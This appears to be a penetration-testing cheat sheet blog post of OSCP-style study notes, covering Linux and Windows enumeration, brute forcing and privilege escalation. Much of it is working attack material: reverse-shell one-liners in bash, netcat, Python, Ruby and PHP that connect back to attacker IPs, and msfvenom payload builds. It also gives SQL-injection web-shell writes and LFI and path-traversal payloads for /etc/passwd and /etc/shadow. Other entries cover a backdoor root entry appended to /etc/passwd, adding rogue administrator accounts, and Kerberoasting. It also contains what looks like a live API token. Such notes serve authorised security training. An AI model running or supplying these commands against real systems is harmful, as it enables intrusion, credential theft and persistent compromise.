---
title: "Offensive Security CheatSheet"
date: 1997-02-21 00:00:00 +8000
categories: [Red team, Offensive Security, Cheatsheet]
tags: []
description: Offensive Security CheatSheet
image:
  path: /assets/img/post/offsec/offsec.png
  alt: Offensive Security Cheat Sheet 
---
_Inspiration and Credits [s4thv1k-oscp-cheatsheet](https://s4thv1k.com/posts/oscp-cheatsheet/)_
# **Linux**

## **Network Enumeration**

#### Ping

```bash
How to know if the target is active?
ping -c 3 {IP} # https://subinsb.com/default-device-ttl-values/
```

#### Nmap

```bash
nmap -p- --open --min-rate 5000 -sS -n -vvv -Pn IP -oG allPorts

nmap -sCV -p 80,443,8080 IP -oN targeted

nmap -sC -sV IP -oN targeted
```

- Add to hosts

```bash
echo "10.10.11.252 domain.htb" | sudo tee -a /etc/hosts
```

#### Technology Detection on web

```bash
whatweb http://domain.htb/
```

#### Masscan

```bash
# Fast web scan 
masscan -p80 {IP ADDRESS}/24 --rate=1000 -e tap0 --router-ip {GATEWAY IP}

masscan -p21,22,139,445 -Pn 192.168.111.0/24 --rate=1000
masscan -p21,22,139,445 -Pn 192.168.0.0/16 --rate=10000
```

#### SMB | TCP/139 | 445

```bash
smbmap -H IP

smbclient -L IP -N

smbclient -N -L //10.129.42.253 #list smb shares
smbclient -N //10.129.42.253//users #connect to an smb share
```

#### SMTP | TCP/25

```bash
# Connect to mail server
 nc -nv {RHOST} 25

VRFY root
```

#### POP3 | 110

```bash
telnet {rhost} 110
```

#### SSH | TCP/22 | 2222

```bash
ssh {USER}@{RHOST}

hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP -s 2222 -t 15

# SSH Brute Force
hydra -f -l {USER} -P {pass.txt} ssh://{RHOST}
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -t  4 #example
hydra -f -t 16 -L {user.txt} -P {pass.txt} ssh://{RHOST
# Dicotrionary Attack
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh


# Upload w scp
scp file.txt user@IP:/home/user/Desktop
 
# Download w scp
scp user@IP:/home/user/Desktop file.txt

# Download file with scp while ssh
scp -i id_rsa pepe@domain.htb:/home/pepe/procmon_2024-
08-23_00:50:02.db domain.db 

# Port Forwarding 
ssh -L 48763:localhost:8080 amay@10.10.11.28

# Pivotin through SSH
ssh adminuser@10.10.155.5 -i id_rsa -D 9050

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
proxychains4 crackmapexec smb 10.10.10.0/24 #Example
```

### Adding SSH Public Key

```bash
#This created both id_rsa and id_rsa.pub
ssh-keygen -t rsa -b 2048 -f racc0x

chmod 700 ~/.ssh
touch authorized_keys # create file in ~/.ssh/ and copied content here
chmod 600 authorized_keys

ssh user@TARGETIP
```

#### FTP | TCP/21

```bash
ftp 192.168.123.2
ftp -A <RHOST>
nmap -p21 --script=<name> <IP> #scan ftp w nmap

wget -r ftp://IP

# Download entire FTP directory
wget -r ftp://{USER}:{PASS}@{RHOST}/

# Brute force FTP
hydra -f -t 16 -l {user} -P {pass.txt} ftp://{RHOST}
hydra -f -t 16 -L {user.txt} -P {pass.txt} ftp://{RHOST}

hydra -l pepito -P pass.txt ftp://IP -t 15
```

#### DNS | UDP/53

```bash
dnsenum domain.htb

#DNSRecon Brute Force
dnsrecon -d {DOMAIN} -D ~/{BRUTE_LIST.txt} -t brt

gobuster dns -r IP -d Domain -w Wordlist -t 100

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list

for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name
```

---

### OSINT

```bash
https://osintframework.com/

# Google hacking
https://www.exploit-db.com/google-hacking-database

#  NetCraft
https://www.netcraft.com/

# Recon-ng

# Github Search
filename:users

# Qualys SSL lab
https://www.ssllabs.com/ssltest/

# Shodan
https://www.shodan.io/

# Security Header Scanner
https://securityheaders.com/

# Pastebin
https://pastebin.com/

# theHarvestor
theharvester -d {SITE} -b google

# Social Searcher
https://www.social-searcher.com/

https://pimeyes.com

#Leaked data
https://dehashed.com/

# Reverse IP LookUp nad more
https://viewdns.info/

#Subfinder
https://phonebook.cz

#Passive Scan
https://github.com/UnaPibaGeek/ctfr
```
#### Google Dorks

```bash
https://www.exploit-db.com

inurl:wp-config.php.txt
site:tiner.com filetype:txt
intext:tinder.com filetype:pdf
site:*.tinder.com
https://pentest-tools.com
```

---

### File Transfer

```bash
wget http://HOST:PORT/file
curl http://HOST:PORT/file -o file
python3 -m http.server 8080
```

### Password Hash | Cracking

```bash
#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa > hash
ssh2john id_rsa > hash

hashcat -m $number hash wordlists.txt --force
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -o found.txt --force
hashcat -m 0 -a 0 -o cracked.txt hash2.txt /usr/share/wordlists/rockyou.txt

ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt


john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
john --wordlist=rockyou.txt protected-docx.hash #hash protected
```

### fcrackzip

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip #Cracking zip files
```

---

## **Web Pentesting**

[Script-Based Guide to Injection Attacks: SQLi, XSS, Command, XML, and HTML](https://medium.com/@harshleenchawla06/script-based-guide-to-injection-attacks-sqli-xss-command-xml-and-html-c11a810841e0)

[File Inclusion - CheatSheet](https://github.com/attacker-codeninja/htb-cheatsheet/blob/master/lfi-rfi-cheatsheet.md)

[HackTricks](https://book.hacktricks.xyz/)


### Domain Enumeration

#### Dirsearch

```bash
dirsearch -u http://url.htb

dirsearch -u http://machine.htb/ --exclude-statuses 404 -o /path/to/output.txt
```

#### Feroxbuster

```bash
feroxbuster -u http://domain.htb

feroxbuster -u http://domain.htb/folder/folder/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,md

feroxbuster -u http://domain.htb:8000 -m GET, POST

feroxbuster -u http://example.com -w wordlist.txt -x 404

feroxbuster -u http://example.com -w wordlist.txt -o results.txt
```

#### Ffuf

```bash
# Virtual Host Fuzzing
ffuf -u https://FUZZ.domain.htb/ -w /path/to/subdomains.txt -H "Host: FUZZ.domain.htb"

ffuf -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/direcotry-list-2.3-medium.txt -u https://miwifi.com/FUZZ

# Fuzzing for Content Discovery with Extensions w verbose output
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://IP:PORT/w2ksvrus/FUZZ.html -e .php,.html,.txt,.bak,.js -v

# Fuzzing GET Parameters
ffuf -u "https://domain.htb/page.php?FUZZ=value" -w /path/to/paramlist.txt

# fuzzing with multiple parameters
ffuf -u https://host.com/FUZZ1/FUZZ2 -w /path/to/wordlist1.txt:/path/to/wordlist2.txt

# filter response status codes
ffuf -u https://host.com/FUZZ -w /path/to/wordlist.txt -fc 404

# Fuzzing with parameter-based LFI
ffuf -u "https://host.com/page.php?file=FUZZ" -w /path/to/lfipayloads.txt

# Fuzzing with a proxy
ffuf -u https://domain.com/FUZZ -w /path/to/wordlist.txt -x http://127.0.0.1:8080

# filter response size
ffuf -u https://domain.com/FUZZ -w /path/to/wordlist.txt -fs 1234

# match status codes
ffuf -u https://domain.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302
```

#### Wfuzz

```bash
wfuzz -c --hc=404,403 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://miwifi.com/FUZZ/

wfuzz -c --hw=6515 -t 200 -z range,1-20000 'https://mi.com/shop/buy/detail?product_id=FUZZ'

wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/direcotry-list-2.3-medium.txt -z list,txt-php http://admin.domain.htb/directory/FUZZ.FUZ2Z #fuzz - txt,php
```

#### Gobuster

```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

gobuster dir -u https://miwifi.com/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --add-slash -b 403,404 -x php,html,txt

gobuster dir -u https://miwifi.com/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html -s 200 -b ''
```


```bash
whatweb http://url.htb
whatweb -l http://url.htb #list all plugins
whatweb -a http://url.htb -v # verbose
```
- Wappalyzer

#### Curl 

```bash
curl -I "http://${TARGET}"

curl -s -X GET "http://sub.domain.htb/102834710284/file.php?action=show&site=FUZZ&password=12345&session=" # fuzz in page 

curl -X GET "http://domain.htb/_framework/file.dll" -H "Host: domain.htb" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" -H "X-Skipper-Proxy: http://127.0.0.1:5000" -H "Connection: close" --output file.dll #download file while BurpSuite with an vuln SSRF
curl -v http://<DOMAIN>  # verbose output
curl -X POST http://<DOMAIN>  # use POST method
curl -X PUT http://<DOMAIN>  # use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd # use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080  # use proxy
```

#### OpenSSL

```bash
openssl s_client -connect tinder.com:443 #Verifi Certificate Web
```

#### Certificate SSL

```bash
sslscan domain.com
```


#### Droopescan | Drupal | CMS

```bash
droopescan scan drupal --url http://ip:8080
```

#### Joomscan | joomla | CMS

```bash
perl joomscan.pl -u http://domain.htb/

droopescan scan joomla --url http://site

sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce 
```

#### Magescan | Magento | CMS

```bash
php magescan.phar scan:all http://name.htb/
```

#### Wpscan | Wordpress | CMS

```bash
# Basic usage
wpscan --url http://domain.htb:8080

wpscan --url "domain.htb" --verbose

#search plugins & users
wpscan --url http://domain.htb:8080 -e vp,u 
wpscan --url http://domain.htb:8080 --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

#Brute Force Attack
wpscan --url http://domain.htb -U admin -P /usr/share/wordlists/rockyou.txt 

# Add Wpscan API to get the details of vulnerabilties.
wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA
```

### Subdomain Enumeration

#### Ffuf

```bash
ffuf -u http://IP -H "Host: FUZZ.domain.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

ffuf -c -u "http://domain.htb" -H "host: FUZZ.domain.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fc 301,302 -mc all
```

#### Gobuster

```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

#### Wfuzz

```bash
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,403,404,302 -H "Host: FUZZ.blazorized.htb" -u http://blazorized.htb -t 100
```


### Dealing with Passwords

```bash
admin:admin
administrator:root
Administrator:root
root:admin

password
password1
Password1
Password@123
password@123
admin
administrator
admin@123
12345678
```
- BruteForce

```powershell
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.

#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

```bash
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

- Manual Code Execution

```bash
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```
- SQLMap - Automated Code execution

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there
```

### Path Traversal | OWASP TOP 10

```bash
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive

```

- URL Encodign
  
```bash
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Local File Inclusion | OWASP TOP 10

```bash
#At first we need 
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>" 
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
```

### LFI | OWASP TOP 10

```bash
LFI EXPLOITS

Basic Payload
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow

URL Encoding
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

Double Encoding
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

UTF-8 Encoding
http://example.com/index.php?page=%c0%ae%c0% ae/%c0%ae%c0% ae/%c0%ae%c0%ae/etc
/passwd

Using Null Byte (%00)
http://example.com/index.php?page=../../../etc/passwd%00

From an Existent Folder
http://example.com/index.php?page=scripts/../../../../../etc/passwd

Path Truncation
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd SECURE CYBER EXPERIENCE

Using PHP Wrappers: filter
http://example.com/index.php?page=php://filter/read-string.rot13/resource=config.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.
php

Using PHP Wrappers: zlib
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/
resource=/etc/shadow

Using PHP Wrappers: zip
echo "<pre><?php system($_GET['cmd']); ?></pre>"> payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
```


### Bypass 403 (Forbidden)

```bash
1. X-Original-URL:
# GET /anything HTTP/1.1
# Host: target.com
# X-Original-URL: /admin

2. Appending %2e after the first slash
# http://target.io/admin => 403
# http://target.io/%2e/admin => 200

3. Try add dot (.) slash (/) and semicolon(;) in the URL
# http://target.io/admin => 403
# http://target.io/admi/. => 200
# http://target.io//admi// => 200
# http://target.io/./admi/.. => 200
# http://target.io/;/admi/ => 200
# http://target.io/.;/admi/ => 200
# http://target.io//;//admi/ => 200

4. Add "..;/" after the directory name
# http://target.io/admin
# http://target.io/admin..;/

1. Try to uppercase the alphabet in the url
# http://target.io/aDmIN
```


### Netcat | Nc

```bash
rlwrap nc -nlvp 9000

nc -lvnp 9001

nc -nv 192.168.1.1 80 #Just in case if nmap unable to pull a service
```

### Searchsploit

```bash
searchsploit <name>
searchsploit -m windows/remote/46697.py #Copies the exploit to the current location
```

### Reverse Shells w MSFVenom

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
#### One Line

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

nc -e /bin/bash 10.10.14.16 7777

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

/bin/bash -c 'exec bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
<?php system(\$_GET['cmd']);?>
<?PHP echo system("bash -c 'bash -i >& /dev/tcp/10.10.14.88/7777 0>&1'");?>
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
#For powershell use the encrypted tool that's in Tools folder

# NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

https://www.revshells.com/
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

### Exiftool

```bash
exiftool img.png
exiftool *.pdf
```




## Linux Privilege Escalation

_Linux Enumeration Commands_

```bash

#list the name of the host/Display all network addresses of the host
hostname -I 
#
uname -a
cat /proc/version # prints almost same infor of above command but more like gcc version....
cat /etc/crontab #Cron Jobs
cat /etc/issue # exact version on the OS

ps # lists the processes that are running
  ps -A # all running processes
  ps axjf # process tree
  ps aux # displays processes with the users as well

env # shows all the environment variable
sudo -l # lists the commands that any user run as root without password
groups # lists the groups that current user is in
id # lists id of group,user

cat /etc/passwd - displays all the user
  cat /etc/passwd | cut -d ":" -f 1 # removes other stuff & only displays users
  ls /home - displays users

bash -p

history - previously ran commands which might have some sensitive info
ifconfig (or) ip a (or) ip route - network related information

netstat - network route
  netstat -a # all listening and established connection
  netstat -at # tcp connections
  netstat -au # udp connections
  netstat -l # listening connections
  netstat -s # network statistics
  netstat -tp # connections with service name and pid we can also add "l" for only listening ports
  netstat -i # interface related information
  netstat -ano

find command which helps us in finding lot of stuff,

  Syntax: find <path> <options> <regex/name> find . -name flag1.txt # find the file named “flag1.txt” in the current directory
  find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
  find / -type d -name config # find the directory named config under “/”
  find / -type f -perm 0777 # find files with the 777 permissions (files readable, writable, and executable by all users)
  find / -perm a=x # find executable files
  find /home -user frank # find all files for user “frank” under “/home”
  find / -mtime 10 # find files that were modified in the last 10 days
  find / -atime 10 # find files that were accessed in the last 10 day
  find / -cmin -60 # find files changed within the last hour (60 minutes)
  find / -amin -60 # find files accesses within the last hour (60 minutes)
  find / -size 50M # find files with a 50 MB size
  find / -writable -type d 2>/dev/null # Find world-writeable folders
  find / -perm -222 -type d 2>/dev/null # Find world-writeable folders
  find / -perm -o w -type d 2>/dev/null # Find world-writeable folders
  find / -perm -o x -type d 2>/dev/null # Find world-executable folders
  We can also find programming languages and supported languages: find / -name perl*, find / -name python*, find / -name gcc* ...etc
  find / -perm -u=s -type f 2>/dev/null # Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. This is important!

#Check commands you can execute with sudo
sudo -l 
#Check Group id
id
#Check folder permissions
ls -la
#Check root process
ps -ef | grep root
#Search write-able services
ls -la $(find . -type s -writable 2>/dev/null) 
#Search write-able files
ls -la $(find . -type f -writable 2>/dev/null) 
#delete file 
shred -zun 10 -v file.php
#Find all SUID binaries
find / -perm -4000 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -writable -type d 2>/dev/null
dpkg -l #Installed applications on debian system
cat /etc/fstab #Listing mounted drives
lsblk #Listing all available drives
lsmod #Listing loaded drivers
getcap -r / 2>/dev/null #Capabilities
watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump

# List All Users on a System
cat /etc/passwd
# Search Passwords
grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' * 2>/dev/null
# List All Users on a System (cleaner, only users)
awk –F’:‘ ’{ print $1}’ /etc/passwd
# List All Logged in Users
who | awk ‘{print $1}’ | sort | uniq | tr ‘\n’ ‘ ’
# Find files modified < 1 day
find . -mtime -1
find / -mtime -1
# Find files modified < 5 min
find . -mmin -5
find / -mmin -5
# Find files within date range
find / -newermt 2022-09-15 ! -newermt 2022-09-19 -type f 2>/dev/null 
# Web files
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
# Creating entry for /etc/passwd
openssl passwd -1 -salt ignite pass123
> $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo "temp:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc/passwd
su temp
pass pass123
# OSCP Flag Proof
cat /root/proof.txt && whoami && hostname && ip addr
```

### Pivoting

```bash
# For this you need to configuration the proxychains.conf
./chisel server -p 1234 --reverse #attacker machine .1
./chisel client {IP}:1234 R:socks #victim machine .2 - tunnel redirection through a SOCKS socket.

# Remote Port Forwarding
./chisel client 10.10.10.1:1234 R:22:20.20.20.3:22 #victim machine .2 
lsof -i:22 # Identify if the service is run by the port 22

#shh with proxychains
proxychains ssh user@20.20.20.3

./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:6150 #victim machine .2
./chisel client 20.20.20.2:1111 R:1111:socks #victim machine .3 


./socat TCP-LISTEN:443,fork TCP:20.20.20.2:442 # 20.20.20.3
./socat TCP-LISTEN:442,fork TCP:10.10.10.1:441 # 20.20.20.2



```

### TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

### Automated Scripts

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```

### Sensitive Information

```bash
cat .bashrc
env #checking environment variables
watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
```

### Sudo/SUID/Capabilities

- https://gtfobins.github.io/

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

### Cron Jobs

```bash
#Detecting Cronjobs
cat /etc/crontab
crontab -l

pspy #handy tool to livemonitor stuff happening in Linux

grep "CRON" /var/log/syslog #inspecting cron logs
```

### NFS

```bash
##Mountable shares
cat /etc/exports #On target
showmount -e <target IP> #On attacker
###Check for "no_root_squash" in the output of shares

mount -o rw <targetIP>:<share-location> <directory path we created>
#Now create a binary there
chmod +x <binary>
```

---

## Tools

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
[ExplainShell](https://www.explainshell.com/)
[CrackShadow](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
[linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[LinEnum](https://github.com/rebootuser/LinEnum)
[LinuxSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)
[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
[GTFO-bins](https://gtfobins.github.io/)
[Chisel](https://github.com/jpillora/chisel)
[Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

# **Windows**

#### Downloading on Windows

```powershell
powershell -command Invoke-WebRequest -Uri http://LHOST:LPORT/FILE -Outfile C:\\temp\\FILE
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://LHOST/FILE" FILE
copy \\kali\share\file .
```

### Command Windows

- Network Enumerate
- Adding Users
- What users belong to groups that allow remote management?

```powershell

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell

net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD

# (Depends on Domain Policies)
net user /domain #all users in domain
net user username /domain # information on a domain user
net group /domain
net group groupname /domain
#File and directory
Get-ChildItem or ls # list files in directory
Set-Location or cd # Change directory
New-Item -ItemType Directory # Create directory
Copy-Item # Copy files
Move-Item # Move/Rename items
Remove-Item # delete files
Get-Content # View file content
Select-String # Search file content
New-Item -ItemType file #Create an empty file
# System information
Get-Process # Display running processes
Get-ComputerInfo # Display system information
Get-NetIPConfiguration # Show network configuration
# User and Permissions
whoami # view current user
Get-LocalUser # List users on the system
Set-Acl # Change file permissions
(Get-Acl).Access # View file permissions
Resolve-DnsName # resolve dns name
Get-NetTCPConnection # view open ports
Get-NetAdapter # view network interfaces
# Scripting and variables
$variable = value # Declare a variable
$variable # display variable value
function MyFunc {} # Create a function
if ($condition) {} # Conditional statements
# 
Start-Process -Verb RunAs # Run command as admin
```

### RDP

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
rdesktop <RHOST>
```

### showmount

```bash
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

### SMB

```powershell
netexec smb IP

netexec smb 10.10.11.14 -u 'anyname' --shares
netexec smb 10.10.11.23 -u name -o '' --shares # List folders shares

#crackmapexec
crackmapexec smb 192.168.1.100 -u username -p password
crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain

# Search user in based error with file.txt
crackmapexec smb IP -u ../file.txt -p '' --kerberos | tee --/output.txt

# List shares
netexec smb host/ip -u user -p password --shares
netexec smb host/ip -u guest -p '' --shares #without password
netexec smb host/ip -u guest -p '' -M spider_plus

# Brute Force Rid:
netexec smb domain -u djlawkdjlakw -p '' --rid-brute 10000

smbclient -N -L //IP

# Enumerate files
smbclient //ip/share -N
smbclient //ip/share -U username password

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

# RID cycle attacks
lookupsid.py -no-pass 'user@domain.htb' 2000
lookupsid.py -no-pass 'guest@rebound.htb' 8000 | grep SidTypeUser | cut -d' # list users
```

### LDAP | TCP/389 & Kerberos | TCP/88

```powershell
# Kerberoasting
crackmapexec ldap 10.10.10.12 -u admin -p pepito123 --kerberoast kerber.txt

# Kerberoasting without PreAuth
GetUserSPNs.p -usersfile ../file.txt -dc-host IP -no-preauth jjones domain.htb/ 

#List all users
crackmapexec ldap 10.10.10.12 -u admin2 -p pepito123 --users | tee adusers.txt

#Folders share
crackmapexec ldap 10.10.10.12 -u admin2 -p pepito123 --shares

# search file on based a extensions
crackmapexec ldap 10.10.10.12 -u admin2 -p pepito123 --spider RedirectedFolders$ --pattern txt

# Validate creds w WinRM
netexec winrm rebound.htb -u pepito -p '1234@$$5'
# Validate creds w Ldap
netexec ldap rebound.htb -u pepito -p '1234@$$5' -k

# try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
ldapsearch -x -H ldap://<IP>:<port> 

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info w're collecting
